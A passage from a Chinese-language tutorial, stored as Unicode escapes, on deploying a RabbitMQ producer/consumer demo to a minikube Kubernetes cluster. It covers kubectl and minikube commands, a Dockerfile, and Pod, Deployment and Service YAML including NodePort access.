k8s\uff0c\u4f46\u662f\u5728\u5f00\u53d1\u73af\u5883\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 minikube \u6765\u6a21\u62df\u4e00\u4e2a k8s \u96c6\u7fa4\u3002k3s \u662f\u53e6\u4e00\u4e2a\u8f7b\u91cf\u7ea7\u7684 k8s \u5b9e\u73b0\uff0c\u4f46\u662f\u5b83\u9700\u8981\u4f9d\u8d56\u4e8e linux \u865a\u62df\u673a\u3002 \u4e0d\u8fc7\uff0cminikube \u53ea\u80fd\u5efa\u7acb\u4e00\u4e2a\u5355\u8282\u70b9\u7684 k8s \u96c6\u7fa4\uff0c\u6240\u4ee5\u5b83\u53ea\u9002\u5408\u7528\u6765\u5b66\u4e60\u548c\u5f00\u53d1\u3002\u5982\u679c\u4f60\u8981\u8fdb\u5165\u751f\u4ea7\u73af\u5883\uff0c\u8bf7\u81ea\u884c\u914d\u7f6e k8s \u96c6\u7fa4\u3002\u4f46\u662f\u6ce8\u610f\uff0c\u8fd9\u91cc\u6211\u4eec\u5b66\u7684\u6240\u6709\u5185\u5bb9\u90fd\u4e0d\u4f1a\u6539\u53d8- \u9664\u4e86 minikube \u9650\u5b9a\u7684\u3002\u6700\u5927\u7684\u533a\u522b\u53ea\u4e0d\u8fc7\u662f\u767b\u9646\u96c6\u7fa4\u65f6\uff0c\u4f60\u8981\u4f7f\u7528 ssh \u800c\u4e0d\u662f minikube ssh\u3002\u6b64\u5916\uff0c\u5728\u8bbf\u95ee\u670d\u52a1\u65f6\uff0c\u4f60\u4e5f\u53ef\u4ee5\u76f4\u63a5\u8bbf\u95ee\uff0c\u4e0d\u9700\u8981 minikube \u7684\u4e00\u4e9b\u7279\u6b8a\u64cd\u4f5c\u3002\u603b\u800c\u8a00\u4e4b\uff0c\u5728\u751f\u4ea7\u73af\u5883\u4e2d\u7684\u4f7f\u7528\u5176\u5b9e\u66f4\u7b80\u5355\u4e00\u4e9b\uff0c\u800c\u4e14\u88ab\u6211\u4eec\u7684\u6240\u6709\u5185\u5bb9\u5305\u542b\u3002 \u53c2\u8003 \u6587\u6863 \u5b89\u88c5\u5373\u53ef\u3002 \u4f7f\u7528 minikube start \u5373\u53ef\u542f\u52a8\u4e00\u4e2a k8s \u96c6\u7fa4\u3002 minikube stop \u53ef\u4ee5\u505c\u6b62\u96c6\u7fa4\u3002 minikube pause \u53ef\u4ee5\u6682\u505c\u96c6\u7fa4\u3002 minikube unpause \u53ef\u4ee5\u6062\u590d\u96c6\u7fa4\u3002 minikube delete \u53ef\u4ee5\u5220\u9664\u96c6\u7fa4\u3002 minikube dashboard \u53ef\u4ee5\u6253\u5f00 k8s \u7684 dashboard\uff0c\u53ef\u4ee5\u5728\u6d4f\u89c8\u5668\u4e2d\u67e5\u770b\u96c6\u7fa4\u7684\u72b6\u6001\u3002\u8fd9\u4e2a\u547d\u4ee4\u884c\u8981\u4fdd\u6301\u8fd0\u884c\uff0c\u5426\u5219 dashboard \u4f1a\u5173\u95ed\u3002 minikube \u672c\u8eab\u4e5f\u662f\u4e00\u4e2a docker \u5bb9\u5668\uff0c\u5728 docker \u4e2d\u4f1a\u663e\u793a\u51fa\u6765\u3002 Kubectl minikube \u53ea\u662f\u542f\u52a8\u4e86\u4e00\u4e2a\u5bb9\u5668\u96c6\u7fa4\uff0c\u7ba1\u7406\u8fd9\u4e2a\u96c6\u7fa4\u7684\u5de5\u5177\u662f kubectl\u3002kubectl \u662f k8s \u7684\u547d\u4ee4\u884c\u5de5\u5177\uff0c\u53ef\u4ee5\u7528\u6765\u7ba1\u7406 k8s \u96c6\u7fa4\u3002 \u4f60\u53ef\u4ee5\u4f7f\u7528 kubectl config current-context \u6765\u67e5\u770b\u5f53\u524d kubectl \u64cd\u4f5c\u7684\u96c6\u7fa4\u3002 k8s \u5fae\u670d\u52a1\u9879\u76ee\u7684\u5b9e\u73b0 \u4e4b\u524d\u5728 Spring Cloud \u90e8\u5206\uff0c\u6211\u4eec\u8981\u4f7f\u7528\u8bb8\u591a\u4e2d\u95f4\u4ef6\uff0c\u4f8b\u5982 Consul \u7b49\u3002\u8fd9\u4e9b\u4e2d\u95f4\u4ef6\u7684\u529f\u80fd\u5f88\u591a\u90fd\u5728 k8s \u5185\u7f6e\u4e86\u3002\u4f8b\u5982\uff0ck8s \u6709\u81ea\u5df1\u7684\u670d\u52a1\u53d1\u73b0\u673a\u5236\uff0c\u6709\u81ea\u5df1\u7684\u914d\u7f6e\u4e2d\u5fc3\uff0c\u6709\u81ea\u5df1\u7684\u8d1f\u8f7d\u5747\u8861\u7b49\u7b49\u3002 \u73b0\u5728\u6211\u4eec\u5148\u5b9e\u73b0\u4e00\u4e2a\u7b80\u5355\u7684\u5fae\u670d\u52a1\u9879\u76ee\u3002\u8fd9\u91cc\u6211\u4eec\u7528\u4e00\u4e2a\u7b80\u5355\u7684\u5e26\u6d88\u606f\u961f\u5217\u7684\u9879\u76ee\u6765\u6f14\u793a\u3002\u6ce8\u610f\uff0c\u6211\u4eec\u6240\u6709\u7684\u9879\u76ee\u90fd\u8981\u53d8\u6210 docker \u5bb9\u5668\u3002 Producer \u9996\u5148\uff0c\u6211\u4eec\u521b\u5efa\u4e00\u4e2a\u751f\u4ea7\u8005\u9879\u76ee\u3002\u8fd9\u4e2a\u9879\u76ee\u4f1a\u5411\u6d88\u606f\u961f\u5217\u53d1\u9001\u6d88\u606f\u3002 \u5728 Javascript \u4e2d\uff0c\u4f7f\u7528 amqplib \u5e93\u6765\u64cd\u4f5c RabbitMQ\u3002 import { Hono } from 'hono' import { connect } from 'amqplib' const mq = \"amqp://user:password@message-queue:5672\" async function connectMq() { const connection = await connect(mq) const channel = await connection.createChannel() await channel.assertQueue('food') return channel } const channel = connectMq() const app = new Hono() app.get('/apple', async (c) => { const ch = await channel ch.sendToQueue('food', Buffer.from('apple')) return c.json({ message: 'apple sent' }) }) app.get('/strawberry/:count?', async (c) => { const ch = await channel const count = Number.parseInt(c.req.param('count') || '1') Array.from({ length: count }).forEach(() => { ch.sendToQueue('food', Buffer.from('strawberry')) }) return c.json({ message: 'strawberry sent', count }) }) export default app \u8fd9\u91cc :count? \u8868\u793a count \u662f\u53ef\u9009\u7684\u3002\u6211\u4eec\u53ef\u4ee5\u8bbf\u95ee /strawberry \u6216\u8005 /strawberry/3 \u3002 URL \u91cc\u5730\u5740\u4f7f\u7528\u7684 message-queue \uff0c\u8fd9\u4e2a\u5c06\u662f\u6211\u4eec k8s \u96c6\u7fa4\u4e2d\u7684\u6d88\u606f\u961f\u5217\u7684\u5730\u5740\u3002\u6211\u4eec\u4f1a\u5728\u540e\u9762\u521b\u5efa\u8fd9\u4e2a\u6d88\u606f\u961f\u5217\u3002 \u7136\u540e\u6211\u4eec\u9700\u8981\u7f16\u5199 Dockerfile\u3002 FROM oven/bun:slim COPY . /app WORKDIR /app RUN bun install CMD bun run ./src/index.ts Consumer \u7136\u540e\u6211\u4eec\u521b\u5efa\u4e00\u4e2a\u6d88\u8d39\u8005\u9879\u76ee\u3002\u8fd9\u4e2a\u9879\u76ee\u4f1a\u4ece\u6d88\u606f\u961f\u5217\u4e2d\u63a5\u6536\u6d88\u606f\u3002 import { Hono } from 'hono' import { connect } from 'amqplib' const mq = \"amqp://user:password@message-queue:5672\" async function connectMq() { const connection = await connect(mq) const channel = await connection.createChannel() await channel.assertQueue('food') return channel } const channelPromise = connectMq() const messageQueue: string[] = [] const app = new Hono() app.get('/ping', async (c) => { return c.json({ message: 'pong' }) }) channelPromise.then((ch) => { // adds to the messageQueue array endlessly ch.consume('food', (msg) => { if (msg) { messageQueue.push(msg.content.toString()) } }, { noAck: true }) }) app.get('/food', async (c) => { return c.json({ messageQueue }) }) export default app \u8fd9\u91cc\u7684 ack \u8868\u793a\u786e\u8ba4\u6536\u5230\u6d88\u606f\u3002\u8fd9\u4e2a\u6b65\u9aa4\u4e4b\u524d\u5728 Spring \u4e2d\u88ab\u81ea\u52a8\u5904\u7406\u4e86\u3002\u6211\u4eec\u5728\u8fd9\u91cc\u5f00\u542f noAck \uff0c\u4ee3\u8868\u4e0d\u786e\u8ba4\uff0c\u76f4\u63a5\u63a5\u6536\u3002 Dockerfile \u4e0e\u751f\u4ea7\u8005\u4e00\u6837\u3002 k8s \u57fa\u7840\u65e0\u72b6\u6001\u7ec4\u4ef6 \u4e0a\u9762\u6211\u4eec\u5b8c\u6210\u4e86 Producer \u548c Consumer \u4e24\u4e2a\u9879\u76ee\u3002\u6211\u4eec\u9700\u8981\u5c06\u8fd9\u4e24\u4e2a\u9879\u76ee\u7ec4\u7ec7\u5230 k8s \u4e2d\uff0c\u5e76\u6dfb\u52a0\u6d88\u606f\u961f\u5217\u3002\u5728\u90e8\u7f72\u4e4b\u524d\uff0c\u6211\u4eec\u9700\u8981\u4e86\u89e3 k8s \u7684\u4e00\u4e9b\u57fa\u7840\u65e0\u72b6\u6001\u7ec4\u4ef6\u3002\u5404\u4e2a\u7ec4\u4ef6\u7684\u914d\u7f6e\u6587\u4ef6\u53ef\u89c1 \u5b98\u65b9\u6587\u6863 \u3002 Pod Pod \u662f k8s \u7684\u6700\u5c0f\u5355\u5143\u3002\u4e00\u4e2a Pod \u53ef\u4ee5\u5305\u542b\u4e00\u4e2a\u6216\u591a\u4e2a\u5bb9\u5668\u3002\u5728\u6211\u4eec\u7684\u4f8b\u5b50\u4e2d\uff0cProducer \u548c Consumer \u90fd\u662f\u4e00\u4e2a\u5bb9\u5668\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5c06\u5b83\u4eec\u653e\u5728\u4e00\u4e2a Pod \u4e2d\u3002 k8s \u7684\u914d\u7f6e\u6587\u4ef6\u662f yaml \u683c\u5f0f\u7684\u3002\u6211\u4eec\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a pod.yaml \u6587\u4ef6\u3002 apiVersion: v1 kind: Pod metadata: name: producer-consumer spec: containers: - name: producer image: producer ports: - containerPort: 3000 resources: requests: memory: \"64Mi\" cpu: \"250m\" limits: memory: \"128Mi\" cpu: \"500m\" - name: consumer image: consumer ports: - containerPort: 3000 resources: requests: memory: \"64Mi\" cpu: \"250m\" limits: memory: \"128Mi\" cpu: \"500m\" \u5bf9\u4e8e k8s \u914d\u7f6e\u7684\u8bed\u6cd5\uff0c\u6211\u4eec\u53ef\u4ee5\u53c2\u8003 \u6587\u6863 \u3002\u5177\u4f53\u800c\u8a00\uff0c\u4e00\u4e2a Pod \u914d\u7f6e\u6587\u4ef6\u5305\u542b\u4e86 apiVersion, kind, metadata, spec \u56db\u4e2a\u90e8\u5206\u3002 apiVersion \u8868\u793a k8s \u7684 api \u7248\u672c\u3002 kind \u8868\u793a\u8fd9\u4e2a\u914d\u7f6e\u6587\u4ef6\u7684\u7c7b\u578b\uff0c\u8fd9\u91cc\u662f Pod\u3002 metadata \u5305\u542b\u4e86\u4e00\u4e9b\u5143\u6570\u636e\uff0c\u4f8b\u5982 Pod \u7684\u540d\u5b57\u3002 spec \u5305\u542b\u4e86 Pod \u7684\u914d\u7f6e\uff0c\u4f8b\u5982\u5bb9\u5668\u7684\u914d\u7f6e\u3002 \u5bf9\u4e8e\u4e0d\u540c\u7684\u7ec4\u4ef6\uff0c\u6211\u4eec\u8981\u5b66\u4e60\u7684\u5c31\u662f spec \u90e8\u5206\u7684\u914d\u7f6e\u3002\u5728\u8fd9\u91cc\uff0c\u6211\u4eec\u914d\u7f6e\u4e86\u4e24\u4e2a\u5bb9\u5668\uff0c\u4e00\u4e2a\u662f Producer\uff0c\u4e00\u4e2a\u662f Consumer\u3002 Pod \u7684 spec \u5982\u4e0b\uff0c containers \u8868\u793a\u5bb9\u5668\u7684\u914d\u7f6e\u3002\u8fd9\u91cc\u6211\u4eec\u914d\u7f6e\u4e86\u4e24\u4e2a\u5bb9\u5668\u3002 name \u8868\u793a\u5bb9\u5668\u7684\u540d\u5b57\u3002 image \u8868\u793a\u5bb9\u5668\u7684\u955c\u50cf\u3002 ports \u8868\u793a\u5bb9\u5668\u4f7f\u7528\u7684 port\uff0c\u8fd9\u91cc\u53ea\u662f\u8fdb\u884c\u8bf4\u660e\uff0c\u5e76\u4e0d\u4f1a\u81ea\u52a8\u6253\u5f00\u7aef\u53e3\u3002ports \u662f\u4e00\u4e2a\u5217\u8868\uff0c\u6bcf\u4e2a\u5143\u7d20\u53ef\u4ee5\u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c\u5305\u542b containerPort \u548c protocol \u4e24\u4e2a\u5c5e\u6027\u3002\u4e00\u822c\u800c\u8a00\uff0c\u6211\u4eec\u53ea\u9700\u8981\u914d\u7f6e containerPort\u3002 resources \u8868\u793a\u5bb9\u5668\u7684\u8d44\u6e90\u914d\u7f6e\u3002requests \u8868\u793a\u5bb9\u5668\u7684\u6700\u5c0f\u8d44\u6e90\uff0climits \u8868\u793a\u5bb9\u5668\u7684\u6700\u5927\u8d44\u6e90\u3002\u8fd9\u91cc\u6211\u4eec\u914d\u7f6e\u4e86\u5185\u5b58\u548c CPU \u7684\u8d44\u6e90\u3002\u56e0\u4e3a k8s \u652f\u6301\u81ea\u52a8\u6269\u5c55\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u914d\u7f6e\u8d44\u6e90\uff0c\u4ee5\u907f\u514d\u8d44\u6e90\u8017\u5c3d\u3002 \u4e00\u822c\u800c\u8a00\uff0c\u6211\u4eec\u4e0d\u4f1a\u76f4\u63a5\u4f7f\u7528 Pod\uff0c\u800c\u662f\u4f7f\u7528\u5176\u5b83\u7ec4\u4ef6\u3002\u5176\u5b83\u7ec4\u4ef6\u4f1a\u81ea\u52a8\u521b\u5efa Pod\u3002 \u6ce8\u610f\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0ck8s \u662f\u4ece registry \u83b7\u53d6\u955c\u50cf\uff0c\u5982\u679c\u8981\u4f7f\u7528\u672c\u5730\u955c\u50cf\uff0c\u9700\u8981\u4f7f\u7528 imagePullPolicy: Never \u3002\u5e76\u4e14\u624b\u52a8\u4f7f\u7528 minikube image load im1 im2 im3 \u547d\u4ee4\u52a0\u8f7d\u955c\u50cf\u3002 \u5373\uff0c apiVersion: v1 # ... containers: - name: producer image: producer imagePullPolicy: Never # ... - name: consumer image: consumer imagePullPolicy: Never # ... \u4e14\u8981\u8fd0\u884c\uff0c minikube image load producer:latest consumer:latest \uff0c\u6765\u52a0\u8f7d\u955c\u50cf\u5230 minikube \u4e2d\u3002 \u6216\u8005\uff0c\u4f7f\u7528 minikube image build -t producer . \u6765\u4f7f\u7528 minikube \u7684 docker \u6784\u5efa\u955c\u50cf\u3002\u8fd9\u6837\u5c31\u4e0d\u9700\u8981\u624b\u52a8\u52a0\u8f7d\u955c\u50cf\u4e86\u3002 \u5982\u679c\u8981\u5220\u9664\u955c\u50cf\uff0c\u4f7f\u7528 minikube ssh \u8fdb\u5165\u96c6\u7fa4\uff0c\u7136\u540e\u7528 docker \u5220\u9664\u955c\u50cf\u5373\u53ef\u3002 ReplicaSet ReplicaSet \u4e00\u822c\u4e0d\u4f1a\u72ec\u7acb\u4f7f\u7528\uff0c\u800c\u662f\u548c Deployment \u4e00\u8d77\u4f7f\u7528\u3002ReplicaSet \u4f1a\u81ea\u52a8\u521b\u5efa Pod\uff0c\u5e76\u4e14\u53ef\u4ee5\u81ea\u52a8\u6269\u5c55 Pod \u7684\u6570\u91cf\u3002\u521b\u5efa Deployment \u65f6\uff0cReplicaSet \u4f1a\u81ea\u52a8\u521b\u5efa\u3002 \u56e0\u4e3a\u6211\u4eec\u4e0d\u4f1a\u76f4\u63a5\u4f7f\u7528 ReplicaSet\uff0c\u6240\u4ee5\u8fd9\u91cc\u4e0d\u518d\u8d58\u8ff0\u5176\u914d\u7f6e\u6587\u4ef6\u3002 Deployment Deployment \u662f k8s \u7684\u4e00\u4e2a\u63a7\u5236\u5668\uff0c\u5b83\u662f\u4e00\u7ec4 Pod \u7684\u62bd\u8c61\u3002Deployment \u4f1a\u81ea\u52a8\u521b\u5efa Pod\uff0c\u5e76\u4e14\u53ef\u4ee5\u81ea\u52a8\u6269\u5c55 Pod \u7684\u6570\u91cf\u3002\u6b64\u5916\uff0cDeployment \u8fd8\u6709\u81ea\u52a8\u91cd\u8bd5\uff0c\u56de\u6eda\uff0c\u70ed\u66f4\u65b0\u7b49\u529f\u80fd\u3002 \u73b0\u5728\uff0c\u6211\u4eec\u4e3a Producer \u548c Consumer \u5206\u522b\u521b\u5efa\u4e00\u4e2a Deployment\u3002 apiVersion: apps/v1 kind: Deployment metadata: name: producer spec: selector: matchLabels: app: producer template: metadata: labels: app: producer spec: containers: - name: producer image: producer ports: - containerPort: 3000 resources: limits: cpu: \"1\" memory: \"512Mi\" \u5bf9\u4e8e Deployment\uff0cspec \u6709\u4e09\u4e2a\u90e8\u5206\uff0c replicas \u8868\u793a Pod \u7684\u6570\u91cf\u3002 selector \u8868\u793a\u9009\u62e9\u5668\uff0c\u7528\u6765\u9009\u62e9\u54ea\u4e9b Pod \u5c5e\u4e8e\u8fd9\u4e2a Deployment\u3002\u8fd9\u91cc\u6211\u4eec\u9009\u62e9 label \u4e2d app \u503c\u4e3a producer \u7684 Pod\u3002 template \u8868\u793a Pod \u7684\u914d\u7f6e\u6587\u4ef6\u6a21\u7248\u3002\u8fd9\u90e8\u5206\u7684\u914d\u7f6e\u548c Pod \u914d\u7f6e\u4e00\u6837\u3002 \u6b64\u5916\uff0c\u6211\u4eec\u8fd8\u9700\u8981\u914d\u7f6e RabbitMQ \u548c consumer\u3002 apiVersion: apps/v1 kind: Deployment metadata: name: mq spec: selector: matchLabels: app: mq template: metadata: labels: app: mq spec: containers: - name: mq image: rabbitmq:4.0-rc-management resources: limits: memory: \"128Mi\" cpu: \"500m\" ports: - containerPort: 5672 apiVersion: apps/v1 kind: Deployment metadata: name: mq spec: selector: matchLabels: app: mq template: metadata: labels: app: mq spec: containers: - name: mq image: rabbitmq:4.0-rc-management resources: limits: memory: \"128Mi\" cpu: \"500m\" env: - name: RABBITMQ_DEFAULT_USER value: user - name: RABBITMQ_DEFAULT_PASS value: password ports: - containerPort: 5672 \u6ce8\u610f\uff0c\u8fd9\u91cc\u7684\u8bed\u6cd5\u4e0e docker-compose \u7c7b\u4f3c\u4f46\u4e0d\u5b8c\u5168\u4e00\u6837\u3002 Service \u6b64\u524d\u6211\u4eec\u5728 Spring Cloud \u4e2d\uff0c\u670d\u52a1\u53d1\u73b0\u4f7f\u7528\u7684\u662f Consul\u3002Service \u7ec4\u4ef6\u4e5f\u6709\u7c7b\u4f3c\u7684\u529f\u80fd\u3002Service \u662f k8s \u7684\u4e00\u4e2a\u670d\u52a1\u53d1\u73b0\u673a\u5236\u3002Service \u4f1a\u81ea\u52a8\u521b\u5efa\u4e00\u4e2a\u865a\u62df IP\uff0c\u7528\u6765\u4ee3\u7406\u4e00\u7ec4 Pod\u3002\u8fd9\u6837\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e2a\u865a\u62df IP \u6765\u8bbf\u95ee\u8fd9\u7ec4 Pod\u3002 \u4e0a\u6587\u4e2d\uff0c\u6211\u4eec\u7684 producer \u548c consumer \u90fd\u4f7f\u7528 amqp://user:password@message-queue:5672 \u6765\u8bbf\u95ee\u6d88\u606f\u961f\u5217\u3002\u56e0\u6b64\u6211\u4eec\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a message-queue \u7684 Service\u3002 apiVersion: v1 kind: Service metadata: name: message-queue spec: selector: app: mq ports: - port: 5672 targetPort: 5672 \u8fd9\u91cc selector \u9009\u62e9\u4e86 label \u4e2d app \u503c\u4e3a mq \u7684 Pod\u3002ports \u914d\u7f6e\u4e86\u7aef\u53e3\u6620\u5c04\u3002\u8fd9\u6837\uff0c\u901a\u8fc7\u8bbf\u95ee message-queue:5672 \u5c31\u53ef\u4ee5\u8bbf\u95ee\u5230 mq Pod \u7684 5672 \u7aef\u53e3\u3002\u5982\u679c\u6211\u4eec\u6709\u591a\u4e2a mq Pod\uff0ck8s \u4f1a\u81ea\u52a8\u8d1f\u8f7d\u5747\u8861\u3002 \u6b64\u5916\uff0c\u5982\u679c\u4f60\u60f3\u66b4\u9732\u591a\u4e2a\u7aef\u53e3\uff0c\u6bcf\u4e2a\u7aef\u53e3\u90fd\u8981\u6709\u4e00\u4e2a\u72ec\u7279\u7684 name\u3002 # ... ports: - name: amqp port: 5672 targetPort: 5672 - name: management port: 15672 targetPort: 15672 \u6ce8\u610f\uff0c\u6240\u6709\u7684 deployment\uff0c\u5982\u679c\u9700\u8981\u8bbf\u95ee\uff0c\u65e0\u8bba\u662f\u5185\u90e8\u8fd8\u662f\u5916\u90e8\uff0c\u90fd\u9700\u8981\u521b\u5efa service\u3002\u56e0\u6b64\u6211\u4eec\u8fd8\u9700\u8981\u4e3a producer \u548c consumer \u521b\u5efa service\u3002 Service \u6709\u4e00\u4e2a type \u53c2\u6570\uff0c\u53ef\u4ee5\u52a0\u5728 spec \u4e2d\u3002type \u6709\u56db\u4e2a\u503c\uff0c ClusterIP\uff1a\u9ed8\u8ba4\u503c\uff0c\u521b\u5efa\u4e00\u4e2a\u865a\u62df IP\uff0c\u53ea\u80fd\u5728\u96c6\u7fa4\u5185\u90e8\u8bbf\u95ee\u3002 NodePort\uff1a\u5c06\u96c6\u7fa4\u7684\u7aef\u53e3\u6620\u5c04\u5230 Node \u7684\u7aef\u53e3\u4e0a\uff0c\u53ef\u4ee5\u5728\u96c6\u7fa4\u5916\u90e8\u8bbf\u95ee\u3002\u4e00\u822c\u7528\u4e8e\u6d4b\u8bd5\u3002 LoadBalancer\uff1a\u521b\u5efa\u4e00\u4e2a\u8d1f\u8f7d\u5747\u8861\u5668\uff0c\u53ef\u4ee5\u5728\u96c6\u7fa4\u5916\u90e8\u8bbf\u95ee\u3002\u5177\u4f53\u914d\u7f6e\u53d6\u51b3\u4e8e\u4e91\u670d\u52a1\u5546\u3002Minikube \u652f\u6301\u8fd9\u4e2a\u7c7b\u578b\uff0c\u5b83\u7684\u884c\u4e3a\u5373\u53ef\u4ee5\u901a\u8fc7 minikube \u547d\u4ee4\u66b4\u9732\u7aef\u53e3\u3002 ExternalName\uff1a\u5c06 Service \u6620\u5c04\u5230\u4e00\u4e2a\u5916\u90e8\u57df\u540d\u3002 \u4e4b\u540e\u6211\u4eec\u4f1a\u5728\u90e8\u7f72\u65f6\u4ecb\u7ecd\u5b83\u4eec\u7684\u4f7f\u7528\u3002\u73b0\u5728\u6211\u4eec\u5148\u4fdd\u7559\u9ed8\u8ba4\u503c\u3002 \u6ce8\u610f\uff0c\u6211\u4eec\u5728\u4e0b\u6587\u4e2d\u4fee\u6539 message queue \u65f6\uff0c\u5f88\u53ef\u80fd\u4e0d\u4f1a\u4fee\u6539 producer \u548c consume\u3002\u8fd9\u65f6\uff0c\u7a0b\u5e8f\u91cc\u7684 channel \u4f1a\u4fdd\u6301\u8fde\u63a5\uff0c\u4f46\u4e8b\u5b9e\u4e0a\u5df2\u7ecf\u5931\u6548\u3002\u8fd9\u4f1a\u5bfc\u81f4 producer \u548c consumer \u65e0\u6cd5\u8bbf\u95ee\u5230\u65b0\u7684 message queue\u3002\u8fd9\u65f6\uff0c\u6211\u4eec\u9700\u8981\u91cd\u542f producer \u548c consumer\u3002\u91cd\u542f\u65b9\u6cd5\u662f\u4f7f\u7528\u547d\u4ee4 kubectl rollout restart deployment producer \u3002 k8s \u72ec\u7acb\u5916\u90e8\u8bbf\u95ee \u73b0\u5728\uff0c\u6211\u4eec\u6709\u4e86 6 \u4e2a\u914d\u7f6e\u6587\u4ef6\uff0c\u5206\u522b\u662f producer, consumer, mq, producer-service, consumer-service, mq-service\u3002\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 kubectl apply -f \u547d\u4ee4\u6765\u90e8\u7f72\u8fd9\u4e9b\u914d\u7f6e\u6587\u4ef6\u3002\u8be5\u547d\u4ee4\u53ef\u5728\u540e\u9762\u52a0\u6587\u4ef6\u5939\u540d\uff0c\u4f1a\u81ea\u52a8\u90e8\u7f72\u6587\u4ef6\u5939\u4e0b\u7684\u6240\u6709\u914d\u7f6e\u6587\u4ef6\u3002\u6216\u8005\u52a0\u6587\u4ef6\u540d\uff0c\u4f1a\u90e8\u7f72\u5355\u4e2a\u6587\u4ef6\u3002 kubectl apply -f . \u73b0\u5728\uff0c\u5c31\u53ef\u4ee5\u5728 dashboard \u4e2d\u770b\u5230 pod \u548c\u4e4b\u524d\u6211\u4eec\u5b9a\u4e49\u7684\u6240\u6709\u7684 service \u7b49\u3002 \u4f46\u662f\uff0c\u8fd8\u6709\u4e2a\u91cd\u8981\u95ee\u9898\u9700\u8981\u89e3\u51b3\uff1a\u5c3d\u7ba1 k8s \u6574\u4e2a\u96c6\u7fa4\u90fd\u5728\u6b63\u5e38\u5de5\u4f5c\uff0c\u6211\u4eec\u5374\u6ca1\u6709\u529e\u6cd5\u8bbf\u95ee\u5230 producer \u548c consumer\u3002\u8fd9\u662f\u56e0\u4e3a\u6211\u4eec\u7684 service \u662f ClusterIP \u7c7b\u578b\u7684\uff0c\u53ea\u80fd\u5728\u96c6\u7fa4\u5185\u90e8\u8bbf\u95ee\u3002 \u4f7f\u7528\u4e0b\u9762\u7684\u65b9\u6cd5\uff0c\u4f60\u53ef\u4ee5\u68c0\u67e5\u51fa\u4f60\u7684\u5fae\u670d\u52a1\u662f\u5426\u6b63\u5e38\u5de5\u4f5c\u3002\u6ce8\u610f\uff0c\u53cd\u4ee3\uff0cNodePort \u53ea\u4f1a\u7528\u4e8e\u6d4b\u8bd5\u73af\u5883\uff0c\u751f\u4ea7\u73af\u5883\u4e2d\uff0c\u5982\u679c\u8282\u70b9\u5f88\u5c11\uff0c\u53ef\u4ee5\u4f7f\u7528 LoadBalancer\uff0c\u4f46\u662f\u4e00\u822c\u90fd\u5e94\u8be5\u4f7f\u7528\u7f51\u5173\u3002\u7f51\u5173\u5c5e\u4e8e\u7edf\u4e00\u8bbf\u95ee\u3002 \u53cd\u4ee3 \u5728\u5f00\u53d1\u6a21\u5f0f\u4e2d\uff0c\u53ef\u4ee5\u4f7f\u7528 minikube service --all \u6765\u8fdb\u884c\u8f6c\u53d1\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u5728\u672c\u5730\u8bbf\u95ee\u5230 k8s \u4e2d\u7684\u670d\u52a1\u3002\u547d\u4ee4\u884c\u4e0a\u4f1a\u663e\u793a\u51fa\u6240\u6709\u53cd\u5411\u4ee3\u7406\u5230\u672c\u673a\u7684\u670d\u52a1\u3002\u6216\u8005\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528 minikube service producer-service --url \u6765\u5355\u72ec\u8f6c\u53d1\u3002 NodePort NodePort \u7c7b\u578b\u7684 service \u53ef\u4ee5\u5c06\u96c6\u7fa4\u7684\u7aef\u53e3\u6620\u5c04\u5230 Node \u7684\u7aef\u53e3\u4e0a\uff0c\u53ef\u4ee5\u5728\u96c6\u7fa4\u5916\u90e8\u8bbf\u95ee\u3002\u4e00\u822c\u7528\u4e8e\u6d4b\u8bd5\u3002 \u6211\u4eec\u53ef\u4ee5\u4fee\u6539 service \u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u5c06 type \u6539\u4e3a NodePort\u3002 apiVersion: v1 kind: Service metadata: name: producer-service spec: selector: app: producer ports: - port: 3000 targetPort: 3000 nodePort: 30001 type: NodePort \u7406\u8bba\u4e0a\uff0c\u53ea\u8981\u8bbf\u95ee minikube \u7684 IP \u5730\u5740\uff08\u4f7f\u7528 minikube ip \u547d\u4ee4\uff09\u548c nodePort\uff0c\u5c31\u53ef\u4ee5\u8bbf\u95ee\u5230 producer \u670d\u52a1\u3002 \u5f88\u53ef\u60dc\uff0c\u5728 MacOS \u6216 Windows \u4e0a\uff0c\u4e8b\u60c5\u6ca1\u8fd9\u4e48\u7b80\u5355\u3002\u8fd9\u662f\u56e0\u4e3a\uff0cminikube \u672c\u8eab\u5c31\u662f\u4e00\u4e2a\u5bb9\u5668\uff0c\u800c\u5728 MacOS \u6216 Windows \u4e0a\uff0cdocker \u662f\u8fd0\u884c\u5728\u865a\u62df\u673a\u4e2d\u7684\u3002 \u73b0\u5728\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528 minikube ssh \u8fdb\u5165 minikube \u7684\u865a\u62df\u673a\uff0c\u7136\u540e\u4f7f\u7528 curl \u547d\u4ee4\u8bbf\u95ee http://localhost:30001/apple \uff0c\u8fd9\u6837\u662f\u53ef\u4ee5\u8bbf\u95ee\u5230 producer \u670d\u52a1\u7684\u3002 minikube \u5b98\u65b9\u662f\u5e0c\u671b\u7528\u6237\u4f7f\u7528 minikube service producer-service --url \u6765\u8bbf\u95ee\u7684\u3002\u4f46\u662f\u6b63\u5982\u6211\u4eec\u524d\u9762\u6240\u8bf4\u7684\uff0c\u5f00\u53d1\u73af\u5883\u4e2d\uff0cClusterIP \u6a21\u5f0f\u4e5f\u80fd\u8bbf\u95ee\uff0c\u53ea\u662f\u4f1a\u6709 Warning\u3002 \u5982\u679c\u4e0d\u4f7f\u7528 docker\uff0c\u800c\u662f\u4f7f\u7528\u5176\u5b83\u7684\u65e0\u9694\u79bb\u7684\uff0c\u652f\u6301\u76f4\u901a\u7684\u865a\u62df\u673a\u6216\u5bb9\u5668\uff0c\u4e5f\u53ef\u4ee5\u76f4\u63a5\u8bbf\u95ee\u3002 LoadBalancer LoadBalancer \u662f k8s 